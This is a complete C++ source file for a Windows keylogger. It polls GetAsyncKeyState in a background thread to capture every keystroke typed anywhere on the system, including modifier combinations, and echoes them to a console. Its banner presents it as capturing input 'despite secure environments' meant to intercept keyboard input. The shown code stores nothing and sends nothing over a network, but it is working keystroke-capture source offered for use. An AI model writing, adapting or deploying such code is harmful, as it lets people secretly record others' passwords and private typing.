#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <atomic>
#include <chrono>
#include <iomanip>

// Virtual key codes for modifier keys
#ifndef VK_LCONTROL
#define VK_LCONTROL 0xA2
#endif
#ifndef VK_RCONTROL
#define VK_RCONTROL 0xA3
#endif
#ifndef VK_LSHIFT
#define VK_LSHIFT 0xA0
#endif
#ifndef VK_RSHIFT
#define VK_RSHIFT 0xA1
#endif
#ifndef VK_LMENU
#define VK_LMENU 0xA4
#endif
#ifndef VK_RMENU
#define VK_RMENU 0xA5
#endif

class KeyLogger {
private:
    std::atomic<bool> running;          // Thread-safe flag for controlling the logger
    std::thread keyboardThread;         // Background thread for key monitoring

    std::map<int, bool> keyStates;      // Tracks current state of each key (pressed/released)
    std::map<int, bool> keyWasPrinted;  // Prevents duplicate printing during key hold
    bool ctrlPressed = false;
    bool altPressed = false;
    bool shiftPressed = false;
    bool capsLock = false;

    // Base characters without modifiers
    std::map<int, char> printableKeys = {
        {0x41, 'A'}, {0x42, 'B'}, {0x43, 'C'}, {0x44, 'D'}, {0x45, 'E'},
        {0x46, 'F'}, {0x47, 'G'}, {0x48, 'H'}, {0x49, 'I'}, {0x4A, 'J'},
        {0x4B, 'K'}, {0x4C, 'L'}, {0x4D, 'M'}, {0x4E, 'N'}, {0x4F, 'O'},
        {0x50, 'P'}, {0x51, 'Q'}, {0x52, 'R'}, {0x53, 'S'}, {0x54, 'T'},
        {0x55, 'U'}, {0x56, 'V'}, {0x57, 'W'}, {0x58, 'X'}, {0x59, 'Y'},
        {0x5A, 'Z'},
        {0x30, '0'}, {0x31, '1'}, {0x32, '2'}, {0x33, '3'}, {0x34, '4'},
        {0x35, '5'}, {0x36, '6'}, {0x37, '7'}, {0x38, '8'}, {0x39, '9'},
        {0x20, ' '}, {0xBA, ';'}, {0xBB, '='}, {0xBC, ','}, {0xBD, '-'},
        {0xBE, '.'}, {0xBF, '/'}, {0xC0, '`'}, {0xDB, '['}, {0xDC, '\\'},
        {0xDD, ']'}, {0xDE, '\''}, {0x6A, '*'}, {0x6B, '+'}, {0x6D, '-'},
        {0x6E, '.'}, {0x6F, '/'}
    };

    // Shift-modified characters (symbols above numbers)
    std::map<int, char> shiftChars = {
        {0x30, ')'}, {0x31, '!'}, {0x32, '@'}, {0x33, '#'}, {0x34, '$'},
        {0x35, '%'}, {0x36, '^'}, {0x37, '&'}, {0x38, '*'}, {0x39, '('},
        {0xBA, ':'}, {0xBB, '+'}, {0xBC, '<'}, {0xBD, '_'}, {0xBE, '>'},
        {0xBF, '?'}, {0xC0, '~'}, {0xDB, '{'}, {0xDC, '|'}, {0xDD, '}'},
        {0xDE, '"'}
    };

    // Non-printable keys with descriptive names
    std::map<int, std::string> keyNames = {
        {0x0D, "[ENTER]"}, {0x1B, "[ESC]"}, {0x08, "[BACKSPACE]"},
        {0x09, "[TAB]"}, {0x10, "[SHIFT]"}, {0x11, "[CTRL]"},
        {0x12, "[ALT]"}, {0x14, "[CAPSLOCK]"}, {0x20, "[SPACE]"},
        {0x25, "[LEFT]"}, {0x26, "[UP]"}, {0x27, "[RIGHT]"}, {0x28, "[DOWN]"},
        {0x2E, "[DEL]"}, {0x21, "[PGUP]"}, {0x22, "[PGDN]"}, {0x23, "[END]"},
        {0x24, "[HOME]"},
        {0x70, "[F1]"}, {0x71, "[F2]"}, {0x72, "[F3]"}, {0x73, "[F4]"},
        {0x74, "[F5]"}, {0x75, "[F6]"}, {0x76, "[F7]"}, {0x77, "[F8]"},
        {0x78, "[F9]"}, {0x79, "[F10]"}, {0x7A, "[F11]"}, {0x7B, "[F12]"}
    };

    // Updates modifier key states (Ctrl, Alt, Shift, CapsLock)
    void UpdateModifierStates() {
        ctrlPressed = (
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) ||
            (GetAsyncKeyState(VK_LCONTROL) & 0x8000) ||
            (GetAsyncKeyState(VK_RCONTROL) & 0x8000)
            );

        altPressed = (
            (GetAsyncKeyState(VK_MENU) & 0x8000) ||
            (GetAsyncKeyState(VK_LMENU) & 0x8000) ||
            (GetAsyncKeyState(VK_RMENU) & 0x8000)
            );

        shiftPressed = (
            (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
            (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
            (GetAsyncKeyState(VK_RSHIFT) & 0x8000)
            );

        capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    }

    // Converts virtual key code to printable character with modifier adjustments
    char GetCharFromVK(int vkCode) {
        if (printableKeys.find(vkCode) == printableKeys.end()) {
            return 0;  // Not a printable key
        }

        char baseChar = printableKeys[vkCode];
        char result = baseChar;

        // Letters (A-Z): Apply CapsLock and Shift logic
        if (vkCode >= 0x41 && vkCode <= 0x5A) {
            // XOR logic: uppercase if CapsLock XOR Shift is true
            bool shouldUppercase = (capsLock != shiftPressed);
            result = shouldUppercase ? baseChar : tolower(baseChar);
        }
        // Numbers and symbols with Shift key
        else if (shiftPressed) {
            auto it = shiftChars.find(vkCode);
            if (it != shiftChars.end()) {
                result = it->second;
            }
            // If no shifted version exists, keep base character
        }
        else {
            result = baseChar;
        }

        return isprint(result) ? result : 0;
    }

    // Checks if any non-modifier key is currently pressed
    bool IsAnyNonModifierKeyPressed() {
        for (const auto& keyPair : printableKeys) {
            if (GetAsyncKeyState(keyPair.first) & 0x8000) {
                return true;
            }
        }

        for (const auto& keyPair : keyNames) {
            int vkCode = keyPair.first;
            // Skip modifier keys to avoid false positives
            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
                vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
                vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
                vkCode == VK_CAPITAL) {
                continue;
            }
            if (GetAsyncKeyState(vkCode) & 0x8000) {
                return true;
            }
        }

        return false;
    }

    // Handles modifier keys when pressed alone (not with other keys)
    void CheckModifierKeys() {
        std::vector<int> modifierKeys = {
            VK_CONTROL, VK_LCONTROL, VK_RCONTROL,
            VK_SHIFT, VK_LSHIFT, VK_RSHIFT,
            VK_MENU, VK_LMENU, VK_RMENU,
            VK_CAPITAL
        };

        for (int vkCode : modifierKeys) {
            SHORT state = GetAsyncKeyState(vkCode);
            bool isPressed = (state & 0x8000) != 0;
            bool wasPressed = keyStates[vkCode];

            // Only trigger on key down (not hold)
            if (isPressed && !wasPressed) {
                bool otherKeyPressed = false;

                
                for (const auto& keyPair : printableKeys) {
                    int otherVK = keyPair.first;
                    if ((GetAsyncKeyState(otherVK) & 0x8000) != 0) {
                        otherKeyPressed = true;
                        break;
                    }
                }

                // Check if any special non-modifier key is also pressed
                if (!otherKeyPressed) {
                    for (const auto& keyPair : keyNames) {
                        int otherVK = keyPair.first;

                        // Skip checking the same modifier key
                        if (vkCode == VK_CAPITAL && otherVK == VK_CAPITAL) continue;
                        if (vkCode == VK_CONTROL && (otherVK == VK_CONTROL || otherVK == VK_LCONTROL || otherVK == VK_RCONTROL)) continue;
                        if (vkCode == VK_SHIFT && (otherVK == VK_SHIFT || otherVK == VK_LSHIFT || otherVK == VK_RSHIFT)) continue;
                        if (vkCode == VK_MENU && (otherVK == VK_MENU || otherVK == VK_LMENU || otherVK == VK_RMENU)) continue;

                        if (printableKeys.find(otherVK) != printableKeys.end()) continue;

                        if ((GetAsyncKeyState(otherVK) & 0x8000) != 0) {
                            otherKeyPressed = true;
                            break;
                        }
                    }
                }

                
                if (!otherKeyPressed) {
                    std::string keyName;
                    switch (vkCode) {
                    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
                        keyName = "[CTRL]"; break;
                    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                        keyName = "[SHIFT]"; break;
                    case VK_MENU: case VK_LMENU: case VK_RMENU:
                        keyName = "[ALT]"; break;
                    case VK_CAPITAL:
                        keyName = "[CAPSLOCK]"; break;
                    }
                    std::cout << "\n" << keyName << "\n";
                }
            }

            keyStates[vkCode] = isPressed;
        }
    }

    // Main key capture logic for all printable and special keys
    void CaptureAllKeys() {
        std::vector<std::string> modifiers;
        if (ctrlPressed) modifiers.push_back("Ctrl");
        if (altPressed) modifiers.push_back("Alt");
        if (shiftPressed) modifiers.push_back("Shift");

        // Process printable keys (letters, numbers, symbols)
        for (const auto& keyPair : printableKeys) {
            int vkCode = keyPair.first;
            SHORT state = GetAsyncKeyState(vkCode);
            bool isPressed = (state & 0x8000) != 0;
            bool wasPressed = keyStates[vkCode];

            // Key down event (not hold)
            if (isPressed && !wasPressed) {
                char ch = GetCharFromVK(vkCode);
                if (ch) {
                    // Normal typing (no Ctrl/Alt modifiers)
                    if (!ctrlPressed && !altPressed) {
                        std::cout << ch << std::flush;
                    }
                    // Modifier combinations (Ctrl+A, Alt+F, etc.)
                    else {
                        if (!modifiers.empty()) {
                            for (size_t i = 0; i < modifiers.size(); i++) {
                                if (i > 0) std::cout << "+";
                                std::cout << modifiers[i];
                            }
                            std::cout << "+" << ch << "\n";
                        }
                    }
                }
            }

            keyStates[vkCode] = isPressed;
        }

        // Process special keys (Enter, F1, arrows, etc.)
        for (const auto& keyPair : keyNames) {
            int vkCode = keyPair.first;

            // Skip keys already handled as printable
            if (printableKeys.find(vkCode) != printableKeys.end()) {
                continue;
            }

            // Skip modifier keys
            if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
                vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
                vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
                vkCode == VK_CAPITAL) {
                continue;
            }

            SHORT state = GetAsyncKeyState(vkCode);
            bool isPressed = (state & 0x8000) != 0;
            bool wasPressed = keyStates[vkCode];

            if (isPressed && !wasPressed) {
                // Always show modifiers with special keys (Ctrl+Enter, Alt+Tab, etc.)
                if (!modifiers.empty()) {
                    for (size_t i = 0; i < modifiers.size(); i++) {
                        if (i > 0) std::cout << "+";
                        std::cout << modifiers[i];
                    }
                    std::cout << "+" << keyPair.second << "\n";
                }
                // Special key alone
                else {
                    std::cout << "\n" << keyPair.second << "\n";
                }
            }

            keyStates[vkCode] = isPressed;
        }
    }

    // Main monitoring loop running in background thread
    void KeyboardLoop() {
        try {
            std::cout << "Monitoring keyboard input..\n";
            std::cout << "Type anywhere, the input should be displayed here\n";
            std::cout << std::string(50, '-') << "\n";

            while (running) {
                UpdateModifierStates();      // Update Ctrl, Alt, Shift, CapsLock
                CheckModifierKeys();         // Handle standalone modifier presses
                CaptureAllKeys();            // Capture all other key presses

                // Small delay prevents 100% CPU usage while maintaining responsiveness
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
        catch (const std::exception& e) {
            std::cerr << "Error in keyboard loop: " << e.what() << "\n";
        }
    }

public:
    KeyLogger() : running(false) {}

    ~KeyLogger() {
        Stop();  // Ensure clean shutdown
    }

    // Starts the keylogger in a background thread
    bool Start() {
        if (running) {
            return false;  
        }

        running = true;
        keyboardThread = std::thread(&KeyLogger::KeyboardLoop, this);

        std::cout << "Key logger running\n";
        std::cout << "Press Ctrl + C to stop \n";
        return true;
    }

    // Stops the keylogger and joins the thread
    void Stop() {
        if (!running) {
            return;
        }

        running = false;
        if (keyboardThread.joinable()) {
            keyboardThread.join();  // Wait for thread to finish
        }
        std::cout << "Logger stopped\n";
    }

    bool IsRunning() const {
        return running;
    }
};

void PrintBanner() {
    std::cout << std::string(50, '=') << "\n";
    std::cout << "GetAsyncKeyState keylogger successfully started!\n";
    std::cout << std::string(50, '=') << "\n";
    std::cout << "Captures input globally despite secure environments that attempt to intercept keyboard input";
}

int main() {
    SetConsoleTitleA("GetAsyncKeyState Keylogger");

    PrintBanner();

    KeyLogger logger;

    try {
        if (!logger.Start()) {
            std::cerr << "Failed to start keylogger\n";
            return 1;
        }

        std::cout << "\nPress Ctrl + C to stop\n";

        // Main thread waits for Ctrl+C while background thread monitors keys
        while (logger.IsRunning()) {
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(0x43) & 0x8000) {
                break;  
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    logger.Stop();

    std::cout << "\nProgram terminated\n";
    return 0;
}